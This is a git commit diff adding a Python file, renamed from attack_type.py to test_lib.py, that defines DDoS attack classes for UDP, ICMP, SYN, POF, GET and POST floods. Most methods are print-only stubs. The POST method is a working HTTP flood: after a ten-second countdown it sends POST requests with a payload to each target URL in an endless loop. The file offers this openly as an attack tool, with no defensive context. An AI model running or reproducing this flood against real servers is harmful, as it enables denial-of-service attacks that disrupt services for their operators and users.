13ce0bfaccc6438e0cc8e9e1d9c77cea2ce70e8f
Riccardo <134144784+riccio8@users.noreply.github.com>
2024-08-04 16:40:46 +0200

    Update and rename attack_type.py to test_lib.py

---
+++ lib/test_lib.py
@@ -0,0 +1,30 @@
+import requests as res
+import time
+
+class VolumeBasedAttack:
+    def udp_flooding(vector, bye):
+        print(f"UDP flooding attack on {vector} with {len(bye)} bytes")
+
+    def icmp(vector, bye):
+        print(f"ICMP attack on {vector} with {len(bye)} bytes")
+
+class ProtocolAttack:
+    def syn_flood(vector, bye):
+        print(f"SYN flood attack on {vector} with {len(bye)} bytes")
+
+    def pof(vector, bye):
+        print(f"POF attack on {vector} with {len(bye)} bytes")
+
+class ApplicationLayerAttack:
+    def post(vector, bye):
+        print(f"POST attack on {vector} with {len(bye)} bytes")
+        print("Using POST method to:", vector)
+        print("You have 10 seconds to end the attack, press Ctrl+C or Ctrl+Z")
+        time.sleep(10)
+        while True:
+            for target in vector:
+                response = res.post(target, data=bye)
+                print(response.text)
+
+    def get(vector, bye):
+        print(f"GET attack  on {vector} with {len(bye)} bytes")
